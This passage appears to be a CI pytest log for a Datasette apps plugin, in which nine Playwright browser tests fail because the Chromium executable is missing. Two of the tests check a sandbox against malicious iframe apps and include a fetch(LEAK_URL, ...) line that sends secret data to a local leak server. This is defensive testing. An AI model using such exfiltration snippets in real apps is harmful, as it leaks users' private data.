+E           ║ Looks like Playwright was just installed or updated.       ║
+E           ║ Please run the following command to download new browsers: ║
+E           ║                                                            ║
+E           ║     playwright install                                     ║
+E           ║                                                            ║
+E           ║ <3 Playwright Team                                         ║
+E           ╚════════════════════════════════════════════════════════════╝
+
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:563: Error
+______ test_iframe_logs_render_below_iframe_in_collapsed_parent_log_panel ______
+
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_iframe_logs_render_below_0')
+
+    def test_iframe_logs_render_below_iframe_in_collapsed_parent_log_panel(tmp_path):
+        content_db_path = tmp_path / "content.db"
+        _create_content_database(content_db_path)
+        server = DatasetteServer(tmp_path, files=[content_db_path])
+        app = asyncio.run(
+            server.create_app(
+                """<!doctype html>
+    <p id="result">waiting</p>
+    <script>
+    (async function() {
+      console.log("Playwright saw this app log", {answer: 42});
+      const result = await datasette.query(
+        "content",
+        "select name from items where score > :score",
+        {score: 2}
+      );
+      document.getElementById("result").textContent = result.rows[0].name;
+    })();
+    </script>""",
+                name="Log bridge",
+                sql_databases=["content"],
+            )
+        )
+    
+>       with server, _browser_page() as page:
+                     ^^^^^^^^^^^^^^^
+
+tests/test_playwright.py:638: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/home/runner/work/_temp/uv-python-dir/cpython-3.13.14-linux-x86_64-gnu/lib/python3.13/contextlib.py:141: in __enter__
+    return next(self.gen)
+           ^^^^^^^^^^^^^^
+tests/test_playwright.py:195: in _browser_page
+    browser = browser_type.launch(**launch_kwargs)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/sync_api/_generated.py:16515: in launch
+    self._sync(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_browser_type.py:97: in launch
+    await self._channel.send(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:69: in send
+    return await self._connection.wrap_api_call(
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = <playwright._impl._connection.Connection object at 0x7f46160b0640>
+cb = <function Channel.send.<locals>.<lambda> at 0x7f4616a0c220>
+is_internal = False, title = None
+
+    async def wrap_api_call(
+        self, cb: Callable[[], Any], is_internal: bool = False, title: str = None
+    ) -> Any:
+        if self._api_zone.get():
+            return await cb()
+        task = asyncio.current_task(self._loop)
+        st: List[inspect.FrameInfo] = getattr(
+            task, "__pw_stack__", None
+        ) or inspect.stack(0)
+    
+        parsed_st = _extract_stack_trace_information_from_stack(st, is_internal, title)
+        self._api_zone.set(parsed_st)
+        try:
+            return await cb()
+        except Exception as error:
+>           raise rewrite_error(error, f"{parsed_st['apiName']}: {error}") from None
+E           playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+E           ╔════════════════════════════════════════════════════════════╗
+E           ║ Looks like Playwright was just installed or updated.       ║
+E           ║ Please run the following command to download new browsers: ║
+E           ║                                                            ║
+E           ║     playwright install                                     ║
+E           ║                                                            ║
+E           ║ <3 Playwright Team                                         ║
+E           ╚════════════════════════════════════════════════════════════╝
+
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:563: Error
+____________ test_iframe_link_click_shows_parent_confirmation_modal ____________
+
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_iframe_link_click_shows_p0')
+
+    def test_iframe_link_click_shows_parent_confirmation_modal(tmp_path):
+        server = DatasetteServer(tmp_path)
+        app = asyncio.run(
+            server.create_app(
+                """<!doctype html>
+    <a id="external-link" href="https://example.com/docs?from=app#section">
+      Open docs
+    </a>
+    <p id="location">still here</p>""",
+                name="External link app",
+            )
+        )
+    
+>       with server, _browser_page() as page:
+                     ^^^^^^^^^^^^^^^
+
+tests/test_playwright.py:695: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/home/runner/work/_temp/uv-python-dir/cpython-3.13.14-linux-x86_64-gnu/lib/python3.13/contextlib.py:141: in __enter__
+    return next(self.gen)
+           ^^^^^^^^^^^^^^
+tests/test_playwright.py:195: in _browser_page
+    browser = browser_type.launch(**launch_kwargs)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/sync_api/_generated.py:16515: in launch
+    self._sync(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_browser_type.py:97: in launch
+    await self._channel.send(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:69: in send
+    return await self._connection.wrap_api_call(
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = <playwright._impl._connection.Connection object at 0x7f46160b2fd0>
+cb = <function Channel.send.<locals>.<lambda> at 0x7f4616a0d300>
+is_internal = False, title = None
+
+    async def wrap_api_call(
+        self, cb: Callable[[], Any], is_internal: bool = False, title: str = None
+    ) -> Any:
+        if self._api_zone.get():
+            return await cb()
+        task = asyncio.current_task(self._loop)
+        st: List[inspect.FrameInfo] = getattr(
+            task, "__pw_stack__", None
+        ) or inspect.stack(0)
+    
+        parsed_st = _extract_stack_trace_information_from_stack(st, is_internal, title)
+        self._api_zone.set(parsed_st)
+        try:
+            return await cb()
+        except Exception as error:
+>           raise rewrite_error(error, f"{parsed_st['apiName']}: {error}") from None
+E           playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+E           ╔════════════════════════════════════════════════════════════╗
+E           ║ Looks like Playwright was just installed or updated.       ║
+E           ║ Please run the following command to download new browsers: ║
+E           ║                                                            ║
+E           ║     playwright install                                     ║
+E           ║                                                            ║
+E           ║ <3 Playwright Team                                         ║
+E           ╚════════════════════════════════════════════════════════════╝
+
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:563: Error
+___________ test_fullscreen_parent_bridge_ui_uses_plugin_stylesheet ____________
+
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_fullscreen_parent_bridge_0')
+
+    def test_fullscreen_parent_bridge_ui_uses_plugin_stylesheet(tmp_path):
+        server = DatasetteServer(tmp_path)
+        app = asyncio.run(
+            server.create_app(
+                """<!doctype html>
+    <a id="external-link" href="https://example.com/docs">Open docs</a>
+    <script>
+    console.error("Fullscreen error");
+    console.log("Fullscreen log");
+    </script>""",
+                name="Fullscreen bridge styles",
+            )
+        )
+    
+>       with server, _browser_page() as page:
+                     ^^^^^^^^^^^^^^^
+
+tests/test_playwright.py:743: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/home/runner/work/_temp/uv-python-dir/cpython-3.13.14-linux-x86_64-gnu/lib/python3.13/contextlib.py:141: in __enter__
+    return next(self.gen)
+           ^^^^^^^^^^^^^^
+tests/test_playwright.py:195: in _browser_page
+    browser = browser_type.launch(**launch_kwargs)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/sync_api/_generated.py:16515: in launch
+    self._sync(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_browser_type.py:97: in launch
+    await self._channel.send(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:69: in send
+    return await self._connection.wrap_api_call(
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = <playwright._impl._connection.Connection object at 0x7f46165ca0f0>
+cb = <function Channel.send.<locals>.<lambda> at 0x7f4616a25d00>
+is_internal = False, title = None
+
+    async def wrap_api_call(
+        self, cb: Callable[[], Any], is_internal: bool = False, title: str = None
+    ) -> Any:
+        if self._api_zone.get():
+            return await cb()
+        task = asyncio.current_task(self._loop)
+        st: List[inspect.FrameInfo] = getattr(
+            task, "__pw_stack__", None
+        ) or inspect.stack(0)
+    
+        parsed_st = _extract_stack_trace_information_from_stack(st, is_internal, title)
+        self._api_zone.set(parsed_st)
+        try:
+            return await cb()
+        except Exception as error:
+>           raise rewrite_error(error, f"{parsed_st['apiName']}: {error}") from None
+E           playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+E           ╔════════════════════════════════════════════════════════════╗
+E           ║ Looks like Playwright was just installed or updated.       ║
+E           ║ Please run the following command to download new browsers: ║
+E           ║                                                            ║
+E           ║     playwright install                                     ║
+E           ║                                                            ║
+E           ║ <3 Playwright Team                                         ║
+E           ╚════════════════════════════════════════════════════════════╝
+
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:563: Error
+______ test_iframe_hash_link_click_runs_app_handler_without_parent_modal _______
+
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_iframe_hash_link_click_ru0')
+
+    def test_iframe_hash_link_click_runs_app_handler_without_parent_modal(tmp_path):
+        server = DatasetteServer(tmp_path)
+        app = asyncio.run(
+            server.create_app(
+                """<!doctype html>
+    <a id="internal-action" href="#" onclick="selectItem(); return false;">
+      Select item
+    </a>
+    <p id="status">waiting</p>
+    <script>
+    function selectItem() {
+      document.getElementById("status").textContent = "selected";
+    }
+    </script>""",
+                name="Hash link action app",
+            )
+        )
+    
+>       with server, _browser_page() as page:
+                     ^^^^^^^^^^^^^^^
+
+tests/test_playwright.py:799: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/home/runner/work/_temp/uv-python-dir/cpython-3.13.14-linux-x86_64-gnu/lib/python3.13/contextlib.py:141: in __enter__
+    return next(self.gen)
+           ^^^^^^^^^^^^^^
+tests/test_playwright.py:195: in _browser_page
+    browser = browser_type.launch(**launch_kwargs)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/sync_api/_generated.py:16515: in launch
+    self._sync(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_browser_type.py:97: in launch
+    await self._channel.send(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:69: in send
+    return await self._connection.wrap_api_call(
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = <playwright._impl._connection.Connection object at 0x7f4616599040>
+cb = <function Channel.send.<locals>.<lambda> at 0x7f4617be5e40>
+is_internal = False, title = None
+
+    async def wrap_api_call(
+        self, cb: Callable[[], Any], is_internal: bool = False, title: str = None
+    ) -> Any:
+        if self._api_zone.get():
+            return await cb()
+        task = asyncio.current_task(self._loop)
+        st: List[inspect.FrameInfo] = getattr(
+            task, "__pw_stack__", None
+        ) or inspect.stack(0)
+    
+        parsed_st = _extract_stack_trace_information_from_stack(st, is_internal, title)
+        self._api_zone.set(parsed_st)
+        try:
+            return await cb()
+        except Exception as error:
+>           raise rewrite_error(error, f"{parsed_st['apiName']}: {error}") from None
+E           playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+E           ╔════════════════════════════════════════════════════════════╗
+E           ║ Looks like Playwright was just installed or updated.       ║
+E           ║ Please run the following command to download new browsers: ║
+E           ║                                                            ║
+E           ║     playwright install                                     ║
+E           ║                                                            ║
+E           ║ <3 Playwright Team                                         ║
+E           ╚════════════════════════════════════════════════════════════╝
+
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:563: Error
+___________ test_malicious_apps_cannot_exfiltrate_to_external_origin ___________
+
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_malicious_apps_cannot_exf0')
+
+    def test_malicious_apps_cannot_exfiltrate_to_external_origin(tmp_path):
+        content_db_path = tmp_path / "content.db"
+        _create_secret_database(content_db_path)
+        with LeakServer() as leak_server:
+            server = DatasetteServer(tmp_path, files=[content_db_path])
+            apps = asyncio.run(_create_malicious_apps(server, leak_server.url))
+    
+>           with server, _browser_page() as page:
+                         ^^^^^^^^^^^^^^^
+
+tests/test_playwright.py:816: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/home/runner/work/_temp/uv-python-dir/cpython-3.13.14-linux-x86_64-gnu/lib/python3.13/contextlib.py:141: in __enter__
+    return next(self.gen)
+           ^^^^^^^^^^^^^^
+tests/test_playwright.py:195: in _browser_page
+    browser = browser_type.launch(**launch_kwargs)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/sync_api/_generated.py:16515: in launch
+    self._sync(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_browser_type.py:97: in launch
+    await self._channel.send(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:69: in send
+    return await self._connection.wrap_api_call(
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = <playwright._impl._connection.Connection object at 0x7f4617baee00>
+cb = <function Channel.send.<locals>.<lambda> at 0x7f4616a25c60>
+is_internal = False, title = None
+
+    async def wrap_api_call(
+        self, cb: Callable[[], Any], is_internal: bool = False, title: str = None
+    ) -> Any:
+        if self._api_zone.get():
+            return await cb()
+        task = asyncio.current_task(self._loop)
+        st: List[inspect.FrameInfo] = getattr(
+            task, "__pw_stack__", None
+        ) or inspect.stack(0)
+    
+        parsed_st = _extract_stack_trace_information_from_stack(st, is_internal, title)
+        self._api_zone.set(parsed_st)
+        try:
+            return await cb()
+        except Exception as error:
+>           raise rewrite_error(error, f"{parsed_st['apiName']}: {error}") from None
+E           playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+E           ╔════════════════════════════════════════════════════════════╗
+E           ║ Looks like Playwright was just installed or updated.       ║
+E           ║ Please run the following command to download new browsers: ║
+E           ║                                                            ║
+E           ║     playwright install                                     ║
+E           ║                                                            ║
+E           ║ <3 Playwright Team                                         ║
+E           ╚════════════════════════════════════════════════════════════╝
+
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:563: Error
+___________ test_csp_allowlisted_origin_can_receive_exfiltrated_data ___________
+
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_csp_allowlisted_origin_ca0')
+monkeypatch = <_pytest.monkeypatch.MonkeyPatch object at 0x7f461658d5c0>
+
+    def test_csp_allowlisted_origin_can_receive_exfiltrated_data(tmp_path, monkeypatch):
+        content_db_path = tmp_path / "content.db"
+        _create_secret_database(content_db_path)
+        monkeypatch.setenv("DATASETTE_APPS_ALLOW_INSECURE_TEST_CSP_ORIGINS", "1")
+        with LeakServer() as leak_server:
+            server = DatasetteServer(tmp_path, files=[content_db_path])
+            app = asyncio.run(
+                server.create_app(
+                    _malicious_app_html(
+                        'fetch(LEAK_URL, {mode: "no-cors"}).catch(function() {});',
+                        leak_server.url,
+                    ),
+                    name="Allowed exfiltration attempt",
+                    sql_databases=["content"],
+                    csp_origins=[leak_server.url],
+                )
+            )
+    
+>           with server, _browser_page() as page:
+                         ^^^^^^^^^^^^^^^
+
+tests/test_playwright.py:852: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/home/runner/work/_temp/uv-python-dir/cpython-3.13.14-linux-x86_64-gnu/lib/python3.13/contextlib.py:141: in __enter__
+    return next(self.gen)
+           ^^^^^^^^^^^^^^
+tests/test_playwright.py:195: in _browser_page
+    browser = browser_type.launch(**launch_kwargs)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/sync_api/_generated.py:16515: in launch
+    self._sync(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_browser_type.py:97: in launch
+    await self._channel.send(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:69: in send
+    return await self._connection.wrap_api_call(
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = <playwright._impl._connection.Connection object at 0x7f4616540b50>
+cb = <function Channel.send.<locals>.<lambda> at 0x7f4616a411c0>
+is_internal = False, title = None
+
+    async def wrap_api_call(
+        self, cb: Callable[[], Any], is_internal: bool = False, title: str = None
+    ) -> Any:
+        if self._api_zone.get():
+            return await cb()
+        task = asyncio.current_task(self._loop)
+        st: List[inspect.FrameInfo] = getattr(
+            task, "__pw_stack__", None
+        ) or inspect.stack(0)
+    
+        parsed_st = _extract_stack_trace_information_from_stack(st, is_internal, title)
+        self._api_zone.set(parsed_st)
+        try:
+            return await cb()
+        except Exception as error:
+>           raise rewrite_error(error, f"{parsed_st['apiName']}: {error}") from None
+E           playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+E           ╔════════════════════════════════════════════════════════════╗
+E           ║ Looks like Playwright was just installed or updated.       ║
+E           ║ Please run the following command to download new browsers: ║
+E           ║                                                            ║
+E           ║     playwright install                                     ║
+E           ║                                                            ║
+E           ║ <3 Playwright Team                                         ║
+E           ╚════════════════════════════════════════════════════════════╝
+
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:563: Error
+--------------------------------- JSON report ----------------------------------
+report saved to: /home/runner/work/ready-for-datasette/ready-for-datasette/staged-results/datasette-apps/datasette-1.0a37/runs/20260715T060155Z-gh-29393019258-a1/.pytest-report.json
+=========================== short test summary info ============================
+FAILED tests/test_playwright.py::test_datasette_query_bridge_returns_data_to_iframe - playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+╔════════════════════════════════════════════════════════════╗
+║ Looks like Playwright was just installed or updated.       ║
+║ Please run the following command to download new browsers: ║
+║                                                            ║
+║     playwright install                                     ║
+║                                                            ║
+║ <3 Playwright Team                                         ║
+╚════════════════════════════════════════════════════════════╝
+FAILED tests/test_playwright.py::test_replaced_iframe_document_cannot_use_global_query_messages - playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+╔════════════════════════════════════════════════════════════╗
+║ Looks like Playwright was just installed or updated.       ║
+║ Please run the following command to download new browsers: ║
+║                                                            ║
+║     playwright install                                     ║
+║                                                            ║
+║ <3 Playwright Team                                         ║
+╚════════════════════════════════════════════════════════════╝
+FAILED tests/test_playwright.py::test_iframe_errors_render_in_parent_error_panel - playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+╔════════════════════════════════════════════════════════════╗
+║ Looks like Playwright was just installed or updated.       ║
+║ Please run the following command to download new browsers: ║
+║                                                            ║
+║     playwright install                                     ║
+║                                                            ║
+║ <3 Playwright Team                                         ║
+╚════════════════════════════════════════════════════════════╝
+FAILED tests/test_playwright.py::test_iframe_logs_render_below_iframe_in_collapsed_parent_log_panel - playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+╔════════════════════════════════════════════════════════════╗
+║ Looks like Playwright was just installed or updated.       ║
+║ Please run the following command to download new browsers: ║
+║                                                            ║
+║     playwright install                                     ║
+║                                                            ║
+║ <3 Playwright Team                                         ║
+╚════════════════════════════════════════════════════════════╝
+FAILED tests/test_playwright.py::test_iframe_link_click_shows_parent_confirmation_modal - playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+╔════════════════════════════════════════════════════════════╗
+║ Looks like Playwright was just installed or updated.       ║
+║ Please run the following command to download new browsers: ║
+║                                                            ║
+║     playwright install                                     ║
+║                                                            ║
+║ <3 Playwright Team                                         ║
+╚════════════════════════════════════════════════════════════╝
+FAILED tests/test_playwright.py::test_fullscreen_parent_bridge_ui_uses_plugin_stylesheet - playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+╔════════════════════════════════════════════════════════════╗
+║ Looks like Playwright was just installed or updated.       ║
+║ Please run the following command to download new browsers: ║
+║                                                            ║
+║     playwright install                                     ║
+║                                                            ║
+║ <3 Playwright Team                                         ║
+╚════════════════════════════════════════════════════════════╝
+FAILED tests/test_playwright.py::test_iframe_hash_link_click_runs_app_handler_without_parent_modal - playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+╔════════════════════════════════════════════════════════════╗
+║ Looks like Playwright was just installed or updated.       ║
+║ Please run the following command to download new browsers: ║
+║                                                            ║
+║     playwright install                                     ║
+║                                                            ║
+║ <3 Playwright Team                                         ║
+╚════════════════════════════════════════════════════════════╝
+FAILED tests/test_playwright.py::test_malicious_apps_cannot_exfiltrate_to_external_origin - playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+╔════════════════════════════════════════════════════════════╗
+║ Looks like Playwright was just installed or updated.       ║
+║ Please run the following command to download new browsers: ║
+║                                                            ║
+║     playwright install                                     ║
+║                                                            ║
+║ <3 Playwright Team                                         ║
+╚════════════════════════════════════════════════════════════╝
+FAILED tests/test_playwright.py::test_csp_allowlisted_origin_can_receive_exfiltrated_data - playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+╔════════════════════════════════════════════════════════════╗
+║ Looks like Playwright was just installed or updated.       ║
+║ Please run the following command to download new browsers: ║
+║                                                            ║
+║     playwright install                                     ║
+║                                                            ║
+║ <3 Playwright Team                                         ║
+╚════════════════════════════════════════════════════════════╝
+======================== 9 failed, 177 passed in 23.53s ========================
